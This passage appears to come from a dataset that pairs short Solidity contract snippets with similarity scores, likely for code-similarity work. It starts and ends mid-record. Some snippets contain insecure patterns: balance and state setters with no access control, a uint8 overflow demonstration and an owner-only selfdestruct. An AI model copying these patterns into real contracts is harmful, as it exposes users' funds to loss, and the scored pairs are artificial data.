    function thisWillWork(address from, address to, uint amount) {
        MyInterface(address(this)).transfer(from, to, amount);
    }

    function thisWillFail(address from, address to, uint amount) {
        transfer(from, to, amount);
    }
}",0.6750904949065831,"contract ERC223Interface {

    uint public totalSupply;

    uint8 public decimals;

    function balanceOf(address who) constant returns (uint);

    function transfer(address to, uint value);

    function transfer(address to, uint value, bytes data);

    event Transfer(address indexed from, address indexed to, uint value, bytes data);

}"
"contract CA4 {

uint public pos;
mapping(address=>uint16) public balances;

function getBalance() view returns (uint16) {
uint16 mybalance = balances[msg.sender];
return mybalance;
}

function getAddressBalance (address myaddress) view returns (uint16) {
return balances[myaddress];
}

function setAddressBalance(address myaddress, uint16 newbalance) public {
pos=9;
balances[myaddress]=newbalance;
}

function setBalance(uint16 newbalance) public {
pos=9;
balances[msg.sender]=newbalance;
}


}",0.674228493555072,"contract BasicToken is ERC20Basic {
	
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(_to != address(0));
        require(_value <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender].sub(_value);
        balances[_to] = balances[_to].add(_value);
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }

}"
"contract TestContract  {

bytes32 byt;
string str;

function setByte(bytes32 value) public {
   byt = value;
}


function setStr(string value) public {
   str = value;
}

}",0.651513401014842,"contract TestContract {
    string name;
    function getName() public constant returns (string){
        return name;
    }
    function setName(string newName) public {
        name = newName;
    }
}"
"contract DAOBalanceSnapShot {

    uint constant D160 = 0x10000000000000000000000000000000000000000;

    mapping (address => uint) public balanceOf;

    address public owner;

    function DAOBalanceSnapShot() {
        owner = msg.sender;
    }


    uint public totalSupply;
    uint public totalAccounts;
    bool public sealed;

    
    
    function fill(uint[] data) {
        if ((msg.sender != owner)||(sealed))
            throw;

        for (uint i=0; i<data.length; i++) {
            address a = address( data[i] & (D160-1) );
            uint amount = data[i] / D160;
            if (balanceOf[a] == 0) {   
                totalAccounts ++;
                balanceOf[a] = amount;
                totalSupply += amount;
            }
        }
    }

    function seal() {
        if ((msg.sender != owner)||(sealed))
            throw;

        sealed= true;
    }
}",0.6515808921161184,"contract MUTOCoin {

    address owner;



    

    string public constant name = ""MUTO"";

    string public constant symbol = ""MTC"";

    uint8 public constant decimals = 8;

    

    

    mapping (address => uint) public balanceOf;



    event Transfer(address from, address to, uint value);



    constructor() public {

        balanceOf[msg.sender] = 200000000000000000;

    }



    function transfer(address _to, uint _value) public {

        

        address _from = msg.sender;

        

        require(_to != address(0));

        

        require(balanceOf[_from] >= _value);               



        balanceOf[_from] -= _value;                    

        balanceOf[_to] += _value;

        emit Transfer(_from, _to, _value);

    }

    

    function killcontract() public {

        if (owner == msg.sender)

            selfdestruct(owner);

    }

}"
"contract Test {
    function test() public pure returns (bytes32[]) {
        bytes32[] memory foo = new bytes32[](2);
        foo[0] = ""hello"";
        foo[1] = ""goodbye"";

        return foo;
    }
}",0.6399975742248261,"contract PazhukovMaxInETH {
    
    bytes32 info = ""I'm smart contract from p5m.ru!"";
    
    function getInfo() view public returns (bytes32) {
        return (info);
    }
    
}"
"contract C {
    function test() returns(uint) {
        uint8 x = 255;
        x += 10;
        return x;
    }
}",0.6645993590113133,"contract time{
function _time() view external returns (uint)
{
    return now ;
    
}
}"
"contract Cup is CupInteraface {
    mapping(bytes32 => S) private _cups;

    constructor(bytes32 cup) public {
        _cups[cup] = S(cup);
    }

    function get(bytes32 cup) public returns (S memory) {
        return _cups[cup];
    }
}",0.6381184793200633,"contract HashMap {
    mapping(bytes32 => bytes) map;
    
    function set(bytes _data) public {
        map[keccak256(_data)] = _data;
    }
    
    function get(bytes32 _hash) public constant returns (bytes data) {
        return map[_hash];
    }
}"
"contract Test {

    mapping(address => mapping(bytes32 => address)) testMapping;

    function didItChangeIt() public returns(bool) {
        address _address = msg.sender;
        bytes32 _bytes32 = keccak256(abi.encodePacked(_address));
        if (testMapping[_address][_bytes32] == 0) {
            testMapping[_address][_bytes32] = _address;
            return (true);
        }
        return (false);
    }
}",0.6224761119328727,"contract ConsensysAcademy{
    mapping(address=>bytes32) public names;
    address[] public addresses;
    
    modifier onlyUnique(){
        if(names[msg.sender] == 0){ _; }else{ throw; }
    }
    function register(bytes32 name) onlyUnique{
        names[msg.sender] = name; 
        addresses.push(msg.sender);
    }
    function addresses() returns(address[]){ return addresses; }
}"
"contract Test {

  function send() payable public {
    address payable recipient = 0x14723A09ACff6D2A60DcdF7aA4AFf308FDDC160C;
    recipient.transfer(1000000000000000000); 
  }

  function myBalance() public view returns(uint) {
      return address(this).balance;
  }

  function betterForwarder(address payable recipient) public payable {
      recipient.transfer(msg.value);
  }

  function returnTheChange(address payable recipient) public payable {
      require(msg.value >= 1 ether);
      recipient.transfer(1 ether);
      if(msg.value > 1 ether) msg.sender.transfer(msg.value - 1 ether);
  }

}",0.6275944324123003,"contract TestABI{

    address owner;

    constructor() public payable{

        owner = msg.sender;

    }

    modifier onlyOwner(){

        require (msg.sender==owner);

        _;

    }

    function () payable public {

        

    }

    

    function getBalance() public constant returns(uint){

        return address(this).balance;

    }

    

    function sendTransfer(address _user,uint _price) public onlyOwner{

        require(_user!=owner);

        if(address(this).balance>=_price){

            _user.transfer(_price);

        }

    }

    

    function getEth(uint _price) public onlyOwner{

        if(_price>0){

            if(address(this).balance>=_price){

                owner.transfer(_price);

            }

        }else{

           owner.transfer(address(this).balance); 

        }

    }

}"
"contract MinValues {

    using HitchensOrderStatisticsTreeLib for HitchensOrderStatisticsTreeLib.Tree;
    HitchensOrderStatisticsTreeLib.Tree playerPredictions; 

    

    function setBid(address player, uint prediction) public {
        playerPredictions.insert(addressToKey(player), prediction);
    }

    

    function min() public view returns(uint) {
        return playerPredictions.first();
    }

    

    function minKeyCount() public view returns(uint value, uint count) {
        uint lowest = min();

        

        (uint _parent, uint _left, uint _right, bool _red, uint _keyCount, uint _count) = playerPredictions.getNode(lowest);
        return (playerPredictions.first(), _keyCount);
    }

    

    function playerMinAtRow(uint row) public view returns(address) {
        uint lowest = min();
        return keyToAddress(playerPredictions.valueKeyAtIndex(lowest, row));
    }

    

    function addressToKey(address a) internal pure returns(bytes32) {
        return bytes32(int(int160(a)));
    }

    function keyToAddress(bytes32 b) internal pure returns(address) {
        return address(uint160(uint(b)));
    }       
}",0.6092049264727628,"contract DutchXExchange {

    

    mapping (address => mapping (address => uint)) public sellVolumesCurrent;

    

    mapping (address => mapping (address => uint)) public buyVolumes;

    address public ethToken;

    function deposit(address tokenAddress,uint amount) public returns(uint);

    function postBuyOrder(address sellToken,address buyToken,uint auctionIndex,uint amount) public returns (uint);



    function claimBuyerFunds(address sellToken, address buyToken, address user, uint auctionIndex) public

        returns(uint returned, uint frtsIssued);



    function withdraw(address tokenAddress,uint amount) public returns (uint);

    function getAuctionIndex(address sellToken, address buyToken) public view returns(uint index);

    function getFeeRatio(address user) public view returns (uint num, uint den); 



    function getCurrentAuctionPrice(address sellToken, address buyToken, uint auctionIndex) public view

        returns (uint num, uint den);

}"
"contract Base {
    function foo() external returns (uint) {
        return 1234;
    }
    function bar() internal returns (uint) {
        return 1234;
    }
    function baz() public returns (uint) {
        return 1234;
    }
}",0.6749391792222681,"contract GemLike {
    function decimals() public view returns (uint);
    function transfer(address,uint) external returns (bool);
    function transferFrom(address,address,uint) external returns (bool);
}"
"contract Manager is Ownable {

    address[] public contracts;
    mapping(address => bool) public isTrusted;

    constructor() { ... }

    modifier onlyTrustedContracts {
        require(isTrusted[msg.sender]);
        _;
    }

    function createNewContract(...) onlyOwner {
        C c = new C(...);
        contracts.push(address(c));
        isTrusted[c] = true;
    }

    

    function sensitive() onlyTrustedContracts ... {}
}",0.6723008533433723,"contract Restricted is Ownable {
    bool private isActive = true;    
    
    modifier contractIsActive() {
        require(isActive);
        _;
    }

    function pauseContract() public onlyOwner {
        isActive = false;
    }

    function activateContract() public onlyOwner {
        isActive = true;
    }

    function withdrawContract() public onlyOwner {        
        msg.sender.transfer(address(this).balance);
    }
}"
"contract storeData {    
    mapping(uint256 => bytes) public data;

    function saveData(bytes memory newData, uint256 dataID) public {
        data[dataID] = newData;
    }


    function readData(uint256 dataID) public view returns(bytes memory) {
        return data[dataID];
    }

}",0.6829217913611274,"contract Trusti {
    string public data = ""trusti.id"";
    
    function getData() public view returns (string memory) {
        return data;
    }
    
    function setData(string memory _dataHash, string memory _dataSignee) public {
        data = _dataHash;
        data = _dataSignee;
    }
}"
"contract A {

    bytes private finalBytes;


    function setBytesCombined() external {
        bytes20 address_string = toBytes(msg.sender);

        bytes1 separator = bytes1("";"");

        
        string memory combinedStringEmpty = new string(address_string.length + separator.length);

        bytes memory combinedBytes = bytes(combinedStringEmpty);

        uint iter = 0;

        for (uint i = 0; i < address_string.length; i++) {
            combinedBytes[iter++] = address_string[i];
        }

        for (uint i = 0; i < separator.length; i++) {
            combinedBytes[iter++] = separator[i];
        }

        finalBytes = bytes(combinedBytes);
    }

    function getBytesCombined() public view returns(bytes memory) {
        return finalBytes;
    }

    function toBytes(address a) internal pure returns (bytes20 b) {
        return bytes20(uint160(a));
    }
}",0.6176193300483916,"contract Metadata {
    using strings for *;

    function tokenURI(uint _tokenId) public pure returns (string memory _infoUrl) {
        string memory base = ""https:
        string memory id = uint2str(_tokenId);
        return base.toSlice().concat(id.toSlice());
    }

    function uint2str(uint i) internal pure returns (string memory) {
        if (i == 0) return ""0"";
        uint j = i;
        uint length;
        while (j != 0) {
            length++;
            j /= 10;
        }
        bytes memory bstr = new bytes(length);
        uint k = length - 1;
        while (i != 0) {
            uint _uint = 48 + i % 10;
            bstr[k--] = toBytes(_uint)[31];
            i /= 10;
        }
        return string(bstr);
    }

    function toBytes(uint256 x) public pure returns (bytes memory b) {
        b = new bytes(32);
        assembly { mstore(add(b, 32), x) }
    }
}"
"contract MyContract {    
    function deposit() payable external {
        
        transferFunds();
    }
    function transferFunds() private {
        
    }
}",0.6402894733597485,"contract iWETH is iERC20 {
    function deposit() external payable;
    function withdraw(uint256 wad) external;
}"
"contract ExampleCoin is ERC20 {
  using SafeMath for uint256;
  string public symbol = ""EXAMPLE"";
  string public name = ""ExampleCoin"";
  uint8 public decimals = 18;
  mapping (address => uint256) balances;
  mapping (address => mapping (address => uint256)) allowed;
  function ExampleCoin() public {
    balances[msg.sender] = 1000 * (10 ** uint256(decimals));
    totalSupply = 1000 * (10 ** uint256(decimals));
  }
}",0.6943817279651546,"contract WWXToken is ERC20Token {
    using SafeMath for uint256;

    string public name = ""Wowoo Exchange Token"";
    string public symbol = ""WWX"";
    uint8 public decimals = 18;

    uint256 public maxSupply = 4770799141 * 10**uint256(decimals);

    constructor (address issuer) public {
        owner = issuer;
        totalSupply = maxSupply;
        balances[owner] = maxSupply;
        emit Transfer(address(0), owner, maxSupply);
    }

}"
"contract HasParameters {
    function A(uint value) {
    }
}",0.643733751741403,"contract VowLike {
    function fess(uint) external;
}"
"contract Old {

  struct Thing {
    uint x;
    uint y;
  }

  Receiver r;

  function Old() {
    
    r = new Receiver();
  }

  
  
  function output() returns(bytes32[10] n, uint[10] a, uint sno, uint x, uint y) {
    

    Thing memory thing;
    thing.x = 1;
    thing.y = 2;
    return(n,a,sno,thing.x, thing.y); 
  }

  function getReceiver() returns(address receiver) {
    return r;
  }
}",0.6175440711322783,"contract GetTest{

    uint a = 1;

    string b = ""b"";

    address c;

    constructor() public {

        c = msg.sender;

    }

    function getOne() public constant returns(uint) {

        return a;

    }

    function getTwo() public constant returns(uint, string){

        return (a, b);

    }

    function getThree() public constant returns (uint, string, address){

        return (a, b, c);

    }

}"
"contract InterableMapping {

    address[] public addressList;
    mapping(address => bool) public isAddress;

    function insertAddress(address customer) public {
        require(!isAddress[customer]);
        addressList.push(customer);
        isAddress[customer] = true;
    }

    function getAddressCount() public view returns(uint count) {
        return addressList.length;
    }
}",0.6184849460519697,"contract Ownable {



    address public owner;



    modifier onlyOwner {

        require(isOwner(msg.sender));

        _;

    }



    constructor () public {

        owner = msg.sender;

    }



    function transferOwnership(address _newOwner) public onlyOwner {

        owner = _newOwner;

    }



    function isOwner(address _address) public constant returns (bool) {

        return owner == _address;

    }

}"
"contract MyFirstContract {
    uint productid;
    string public productname;

    function setname (string memory name1) public {
        productname = name1;
    }

    function getname () public view returns (string memory) {
        return productname;
    }
}",0.6631391006670766,"contract Coursetro {
    
   string fName;
   uint age;
   
   function setInstructor(string _fName, uint _age) public {
       fName = _fName;
       age = _age;
   }
   
   function getInstructor() public constant returns (string, uint) {
       return (fName, age);
   }
    
}"
"contract Test {
    function testit(address a) {
        a.send(123);
    }
}",0.6473131498889214,"contract Caller {
    function callAddress(address a) {
        a.call();
    }
}"
"contract Send {

    function sendtest() payable returns(bool ) {
        Test t = new Test();
        require(msg.value>0);
        bool res = t.send(msg.value);
        return res;

    }

}",0.6038874082023721,"contract ERC20Mintable is ERC20 {
    
    function mint(address to, uint256 value) public returns (bool) {
        _mint(to, value);
        return true;
    }
}"
"contract C {

    function c() public returns (uint[]) {
        return f(1,2);
    }

    function f(uint a, uint b) private returns (uint[] memory memOffset) {
        assembly {
             
             
             mstore(add(memOffset, 0x00), 2) 
             mstore(add(memOffset, 0x20), a) 
             mstore(add(memOffset, 0x40), b) 
        }
    }
}",0.6099412443553969,"contract SafeMath {
    function safeSub(uint a, uint b) pure internal returns (uint) {
        assert(b <= a);
        return a - b;
    }

    function safeAdd(uint a, uint b) pure internal returns (uint) {
        uint c = a + b;
        assert(c >= a && c >= b);
        return c;
    }
}"
"contract b {
    mapping(uint => function()) funcMap;

    function g() public pure {
        uint x=0;
    }

    function update() public {
        funcMap[1] = g;
    }

}",0.6211758783042163,"contract IERC20Token {
	function decimals() public pure returns (uint8) {}
	function totalSupply() public pure returns (uint256) {}
}"
"contract Test2 {
    uint8[] a; 
    function Test2() {
        a = [1, 2, 3];
    }
}",0.6885641229564413,"contract Test {
    uint public test;
    
    function Test() {
        test = 1;
    }
}"
"contract MembersContract {

    struct Member {
        uint balance;
        bool exists;
    }

    mapping(address => Member) public members;

    function isMember(address member) public view returns(bool isIndeed) {
        return members[member].exists;
    }

    function addMember(address member) public returns(bool success) {
        require(!isMember(member));
        members[member].exists = true;
        return true;
    }

    function addBalance(address member, uint amount) public returns(bool success){
        require(isMember(member));
        members[member].balance += amount;
        return true;
    }
}",0.6387750770661572,"contract ERC20Token {
  function totalSupply() public view returns(uint);
  function balanceOf(address tokenOwner) public view returns(uint balance);
  function allowance(address tokenOwner, address spender) public view returns(uint remaining);
  function transfer(address to, uint tokens) public returns(bool success);
  function approve(address spender, uint tokens) public returns(bool success);
  function transferFrom(address from, address to, uint tokens) public returns(bool success);
}"
"contract AccessControl {

    address public ceoAddress;

    modifier onlyCEO() {
        require(msg.sender == ceoAddress);
        _;
    }

    constructor() {
        
        ceoAddress = msg.sender;
    }

    function setCEO(address _newCEO) external onlyCEO {
        require(_newCEO != address(0));

        ceoAddress = _newCEO;
    }
}",0.6876864171654515,"contract TombAccessControl {

    address public ownerAddress;



    modifier onlyOwner() {

        require(msg.sender == ownerAddress);

        _;

    }



    function withdrawBalance() external onlyOwner {

        address contractAddress = this;

        ownerAddress.transfer(contractAddress.balance);

    }

}"
"contract Shop {

    struct ShopOwner {
        string name;
        bytes32[] productList;
    }

    address[] public shopOwnerIds;
    mapping(address => ShopOwner) public shopOwners;

    struct Product {
        string name;
    }

    function shopCount() public view returns(uint) { return shopOwnerIds.length; }
    function shopProductCount(address shopOwnerId) public view returns(uint) { return shopOwners[shopOwnerId].productList.length; }

    function shopOwnerProductIdAtIndex(address shopOwnerId, uint row) public view returns(bytes32) {
        return shopOwners[shopOwnerId].productList[row];
    }
}",0.6057369084037152,"contract LLCTokenFactory {

  

  mapping (address => bool) public validContracts; 
  address[] public contracts;

  

  function getContractCount() 
    public
    view
    returns(uint contractCount)
  {
    return contracts.length;
  }

  

  function getDeployedContracts() public view returns (address[] memory)
  {
    return contracts;
  }

  

  function newLLCToken(string memory name, string memory symbol, uint256 init, address owner)
    public
    returns(address)
  {
    LLCToken c = new LLCToken(name, symbol, init, owner);
    validContracts[c] = true;
    contracts.push(c);
    return c;
  }
}"
"contract transfer {

    struct Asset {
        string name;
        uint price;
    }

    
    struct Owner {
        address[] ownerAddresses;
    }

    
    mapping(uint => Owner) owners;

    function createAsset(string memory name, uint price) public {
        
        uint id = getRandom();

        
        Asset memory newAsset = Asset(name, price);

        
        owners[id].ownerAddresses.push(msg.sender);
    }

    function transferProduct(uint id) public payable {
        owners[id].ownerAddresses.push(msg.sender);
    }

    
    function getOwners(uint id) public view returns (address[] memory) {
        return (owners[id].ownerAddresses);
    }

}",0.6551182292124181,"contract CoilChecker {



	mapping (string => bool) coils;

	address owner;



	constructor() public {

        owner = msg.sender;

    }



	modifier onlyOwner() {

		require(msg.sender == owner);

		_;

	}



    function addCoil(string memory _id) public onlyOwner {

        coils[_id] = true;

    }



	function changeOwner(address _newOwner) public onlyOwner {

        owner = _newOwner;

    }



	function removeCoil(string memory _id) public onlyOwner {

        coils[_id] = false;

    }



	function getCoil(string memory _id) public view returns (bool coilStatus) {

        return coils[_id];

    }



}"
"contract ProductItem {
    address[] _owners;
    address _currentOwner;
    address _nextOwner;
    string _productDigest;

    function ProductItem(string productDigest) {
        _currentOwner = msg.sender;
        _productDigest = productDigest;
    }

    function setNextOwner(address nextOwner) returns(bool set) {
        if (_currentOwner != msg.sender) {
           return false;
        }
        _nextOwner = nextOwner;
        return true;
    }

    function confirmOwnership() returns(bool confirmed) {
        if (_nextOwner != msg.sender) {
            return false;
        }
        _owners.push(_nextOwner);
        _currentOwner = _nextOwner;
        _nextOwner = address(0);
        return true;
    }

    function getOwner() constant returns(address owner) {
        return _currentOwner;
    }

    function getOwners() constant returns(address[] owners) {
        return _owners;
    }

    function getProduct() constant returns (string product) {
       return _productDigest;
    }
}",0.633511535543564,"contract Ownable {

    address private _owner;

    

    event OwnershipRenounced(address indexed previousOwner);

    event OwnershipTransferred(

    address indexed previousOwner,

    address indexed newOwner

    );

    

    

    constructor() public {

        _owner = msg.sender;

    }

    

    

    function owner() public view returns(address) {

        return _owner;

    }

    

    

    modifier contract_onlyOwner() {

    require(isOwner());

    _;

    }

    

    

    function isOwner() public view returns(bool) {

        return msg.sender == _owner;

    }

    

    

    function renounceOwnership() public contract_onlyOwner {

        emit OwnershipRenounced(_owner);

        _owner = address(0);

    }

    

    

    function transferOwnership(address newOwner) public contract_onlyOwner {

        _transferOwnership(newOwner);

    }

    

    

    function _transferOwnership(address newOwner) internal {

        require(newOwner != address(0));

        emit OwnershipTransferred(_owner, newOwner);

        _owner = newOwner;

    }

}"
"contract Test {
    uint256 a;
    uint256 b;
    uint256 c;
    uint256 d;
    uint256 e;
    mapping (string => bool) exists;

    function Test() public {
        exists[""my_key""] = true;
    }
}",0.6444976759932712,"contract SafeMath {

	function safeAdd(uint256 a, uint256 b) internal pure returns (uint256) {

		uint256 c = a + b;

		assert(c >= a && c >= b);



		return c;

	}

}"
"contract State {

    uint256 public someVal;

    function set(uint v) public payable {
        someVal = v;
    }
}",0.6883625511185171,"contract Example {

    uint256 public value;

    function setValue(uint256 _value) public {

        value = _value;

    }

}"
"contract Token {
    uint totalSupply;
    address crowdsaleContract;

    function Token() public {
        totalSupply = 0;
    }

    function mint() public{
        require(msg.sender == crowdsaleContract);
        
    }
}",0.6974803352372051,"contract Token {

  function totalSupply() constant public returns (uint256 _total_supply);

  function balanceOf(address _owner) constant public returns (uint256 balance);

}"
"contract A {
  ...
  function doSomething() public payable {
     
     
     contractB.doSomethingElse();
  }
}",0.6929067040826233,"contract ETHCOOLMain {
    function contractBoost(uint share) public payable {}
}"
"contract B {
  ...
  function doSomethingElse() public {
     
     
     contractC.doLastThing();
  }
}",0.6165998256329739,"contract callBackContract {

    function __response(uint _price) public;

}"
"contract B is A {
    uint256 public b;

    function initialize(uint256 _b) public {
        b = _b;
    }
}",0.6794406126605015,"contract MSD2 {

   

    function fus (uint256 i) public pure returns (uint256) {

        return i*100;

    }

}"
"contract otherContract {
    myContract mc;
    function otherContract (address _mc) {
        mc = myContract(_mc);
    }
    function getMyMapItem (uint key) constant returns (uint, address) {
        return mc.myMap(key);
    }
}",0.6414453912972019,"contract OtcInterface {

    function getPayAmount(address, address, uint) public constant returns (uint);

    function buyAllAmount(address, uint, address pay_gem, uint) public returns (uint);

}"
"contract Risky {

    string public vital;

    constructor() public {
        vital = ""do not change"";
    }
}",0.6000898183424964,"contract Ownable {

    

    address public owner = 0x0;

    

    constructor() public {

        owner = msg.sender;

    }

}"
"contract Careless is Risky {

    function oops() public {

        

        vital = ""game over"";
    }
}",0.610462261275967,"contract Mortal is DSAuth {
    function kill() public auth {
        selfdestruct(owner);
    }
}"
"contract Cautious {

    string private vital;

    constructor() public {
        vital = ""cannot be changed by accident"";
    }

    function getVital() public view returns(string) {
        return vital;
    }

    function setVital(string youKnowWhatYoureDoing) public {
        vital = youKnowWhatYoureDoing;
    }
}",0.6119553904660935,"contract IERC721Metadata {

  
  function name() public view returns (string);

  
  function symbol() public view returns (string);

  
  function description() public view returns (string);

  
  function tokenMetadata(uint256 assetId) public view returns (string);
}"
"contract Dummy {
  uint public a = 0;

  function increment() {
    a = a + 1;
  }
}",0.6586129495318551,"contract Counter {
    uint public counter;
    function increment() public { counter++; }
}"
"contract exercise {

uint public balance; 
string name= ""Sara"" ;
int[] public nums=[1,2,3];

function setBalance(uint x) public { 
    balance = x; 

}

function getBalance() public view returns (uint) {
    return balance;
}

function doubleBalance() public view returns (uint) { 
    return 2*balance; 

}

}",0.6604143977717516,"contract ERC20Basic {
  function totalSupply() public view returns (uint);
  function balanceOf(address who) public view returns (uint);
  function transfer(address to, uint value) public returns (bool);
  event Transfer(address indexed from, address indexed to, uint value);
}"
"contract NewContract {

        Mytoken token;

        uint256 public rate;

        function NewContract(uint256 _rate,address _tokenAddress){
           token = Mytoken(_tokenAddress);
           rate = _rate;
        }
        function () payable {
            token.mint(msg.sender, msg.value);
        }
    }",0.6179045548737735,"contract ContractReceiver {
	function tokenFallback(address _from, uint _value, bytes _data) public pure {
	}
	function doTransfer(address _to, uint256 _index) public returns (uint256 price, address owner);
}"
"contract Auth {      
    function verify(address p, bytes32 hash, uint8 v, bytes32 r, bytes32 s) constant returns(bool) {
        
        
        
        return ecrecover(hash, v, r, s) == p;
    }
}",0.628840438374015,"contract Registrar {
  function transfer(bytes32 _hash, address newOwner);
  function entries(bytes32 _hash) constant returns (uint, Deed, uint, uint, uint);
}"
"contract KnownContract {
  address unknownContractAddress = '0x0123...';

  function callFriendContract(uint param1) public {
     uint res = contractX(unknownContractAddress).methodY(param1);
  }
}",0.641411921908209,"contract NEST_ToLoanDataContract {

    

    function addContractAddress(address contractAddress) public;

    

    function checkContract(address contractAddress) public view returns (bool);

}"
"contract User {
    uint256 public id;
    bytes32 public name;
    uint8 public age;

    constructor( uint256 _id, bytes32 _name, uint8 _age) public {
        name = _name;
        id = _id;
        age = _age;
    }
}",0.6136707622921508,"contract BryCoin is CappedToken {
 
    string public name = ""BryCoin"";
    string public symbol = ""bryc"";
    uint8 public decimals = 18;

    constructor(
        uint256 _cap
        )
        public
        CappedToken( _cap ) {
    }
}"
"contract MultisenderApp {

function multisendEther(address[] calldata _contributors, uint256[] calldata _balances) external payable {
    uint256 total = msg.value;
    uint256 i = 0;
    for (i; i < _contributors.length; i++) {
        require(total >= _balances[i]);
        assert(total - _balances[i] > 0);
        total = total - _balances[i];
        (bool success, ) = _contributors[i].call.value(_balances[i])("""");
        require(success, ""Transfer failed."");
    }
}    ",0.6051731506581441,"contract ExternalCaller {
    function externalTransfer(address _to, uint256 _value) internal {
        require(address(this).balance >= _value, ""ExternalCaller: insufficient ether balance"");
        externalCall(_to, _value, """");
    }

    function externalCall(address _to, uint256 _value, bytes memory _data) internal {
        (bool success, bytes memory returndata) = _to.call.value(_value)(_data);
        require(success, string(returndata));
    }
}"
"contract Vote {

  uint public totalVotes;

  mapping (address => uint) public voterCount;

  function vote(uint votes) returns(bool success) {
    totalVotes += votes;
    voterCount[msg.sender] += votes; 
    return true;
  }
}",0.6511190391679216,"contract Token{

    function transferFrom(address from, address to, uint tokens) public returns (bool success);

    function balanceOf(address tokenOwner) public view returns (uint balance);

}"
"contract A {
  ...
  function inOrder() public {
    b.step1();
    b.step2();
    c.somethingElse(); 
  }
}",0.6109566732916187,"contract PepInterface {
    function peek() public returns (bytes32, bool);
}"
"contract Test {
    mapping(address => bool) isSomebody;

    function addSomebody(address _address) public {
        isSomebody[_address] = true;
    }

    function deleteSomebody(address _address) public {
        delete isSomebody[_address];
    }
}",0.6411154739520027,"contract IUserData {

    

    function setUserRef(address _address, address _refAddress, string _gameName) public;

    

    function getUserRef(address _address, string _gameName) public view returns (address);

}"
"contract Test {
    mapping (uint128 => address[]) data;

    function addFeature() public {
        data[0] = new address[](0);
    }
}",0.6482648045811796,"contract Dai {

     function transferFrom(address src, address dst, uint wad) public returns (bool) {}

}"
"contract Store is StoreInterface {

    uint weight;

    event LogSetWeight(address sender, uint weight);

    function getWeight() public view returns(uint) {
        return weight;
    }

    function setWeight(uint _weight) public returns(bool) {
        weight = _weight;
        emit LogSetWeight(msg.sender, _weight);
        return true;
    } 
}",0.6288973068001851,"contract SetInterface {

  
  function issue(uint _quantity) public returns (bool success);
  
  
  function redeem(uint _quantity) public returns (bool success);

  event LogIssuance(
    address indexed _sender,
    uint _quantity
  );

  event LogRedemption(
    address indexed _sender,
    uint _quantity
  );
}"
"contract Reader {

    StoreInterface store;

    constructor(address storeAddress) public {
        store = StoreInterface(storeAddress);
    }

    function getWeight() public view returns(uint) {
        return store.getWeight();
    }

    function setWeight(uint weight) public returns(bool) {
        return store.setWeight(weight);
    }
}",0.6369937518374835,"contract ApprovedCreatorRegistryInterface {



    function getVersion() public pure returns (uint);

    function typeOfContract() public pure returns (string);

    function isOperatorApprovedForCustodialAccount(

        address _operator,

        address _custodialAddress) public view returns (bool);



}"
"contract Test {

    mapping (uint256 => address) aMapping;

    function set() public {
        aMapping[1] = this;
    }

    function testA() public  {
        aMapping[0] = 0;
    }

        function testB() public  {
        aMapping[1] = 0;
    }

            function testC() public  {
        aMapping[2] = 0;
    }
}",0.6070150971418375,"contract JoinLike {
    function ilk() public returns (bytes32);
    function gem() public returns (GemLike);
    function dai() public returns (GemLike);
    function join(address, uint) public;
    function exit(address, uint) public;
}"
"contract TokenCrowdsale {

    using SafeMath for uint256;

    
    address public beneficiary;                     
    address public creator;                         
    address public confirmedBy;                     
    uint256 public maxSupply = 15000000e8;    
    bool public purchasingAllowed = false;
    uint256 public totalSupplied = 0;

    
    uint256 public rate = 2000;

    enum Stages {
        PreSale, 
        InProgress, 
        Ended, 
        Withdrawn 
    }

    Stages public stage = Stages.PreSale;

    
    Token public deplToken;

    
    mapping (address => uint256) balances;

    
    modifier atStage(Stages _stage) {
        require(stage == _stage);
        _;
    }

    
    modifier onlyBeneficiary() {
        require(beneficiary == msg.sender);
        _;
    }

    
    function balanceOf(address _investor) constant returns (uint256 balance) {
        return balances[_investor];
    }


    function enablePurchasing() onlyBeneficiary atStage(Stages.PreSale) {
        purchasingAllowed = true;
        stage = Stages.InProgress;
    }

    function disablePurchasing() onlyBeneficiary atStage(Stages.InProgress) {
        purchasingAllowed = false;
        stage = Stages.Ended;
    }

    function enableNewPurchasing() onlyBeneficiary atStage(Stages.Withdrawn) {
        purchasingAllowed = true;
        stage = Stages.InProgress;
    }

    
    function TokenCrowdsale(address _tokenAddress, address _beneficiary, address _creator) {
        deplToken = Token(_tokenAddress);
        beneficiary = _beneficiary;
        creator = _creator;
    }

    
    function confirmBeneficiary() onlyBeneficiary {
        confirmedBy = msg.sender;
    }


    event sendTokens(address indexed to, uint256 value);


    
    function withdraw() onlyBeneficiary atStage(Stages.Ended) {
        uint256 ethBalance = this.balance;
        beneficiary.transfer(ethBalance);
        stage = Stages.Withdrawn;
    }

    
    function () payable atStage(Stages.InProgress) {

        require(purchasingAllowed);
        if (msg.value == 0) { return; }
        uint256 weiAmount = msg.value;
        address investor = msg.sender;
        uint256 received = weiAmount.div(10e7);
        uint256 tokens = (received).mul(rate);

        if (msg.value >= 10 finney) {
            uint256 bonusToken = (tokens.div(100)).mul(20);
            tokens = tokens.add(bonusToken);
        }

        sendTokens(msg.sender, tokens);
        deplToken.transfer(investor, tokens);
        totalSupplied = (totalSupplied).add(tokens);

        if (totalSupplied >= maxSupply) {
            purchasingAllowed = false;
            stage = Stages.Ended;
        }

    }


    function tokensAvailable() constant returns (uint256) {
        return deplToken.balanceOf(this);
    }


    function withdrawForeignTokens(address _tokenContract) onlyBeneficiary public returns (bool) {
        ForeignToken token = ForeignToken(_tokenContract);
        uint256 amount = token.balanceOf(address(this));
        return token.transfer(beneficiary, amount);
    }
}",0.6745219807328856,"contract BitMilleCrowdsale {
    using SafeMath for uint256;

    
    ERC20 public token;

    
    address public wallet;

    
    uint256 public weiRaised;

    uint256 public openingTime;
    uint256 public closingTime;

    
    modifier onlyWhileOpen {
        require(now >= openingTime && now <= closingTime);
        _;
    }

    
    modifier onlyAfterClosing {
        require(now > closingTime);
        _;
    }

    
    event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);

    function BitMilleCrowdsale() public {
        wallet = 0x468E9A02c233C3DBb0A1b7F8bd8F8E9f36cbA952;
        token = ERC20(0xabb3148a39fb97af1295c5ee03e713d6ed54fd92);
        openingTime = 1520946000;
        closingTime = 1523970000;
    }

    
    
    

    
    function () external payable {
        buyTokens(msg.sender);
    }

    
    function buyTokens(address _beneficiary) public payable {
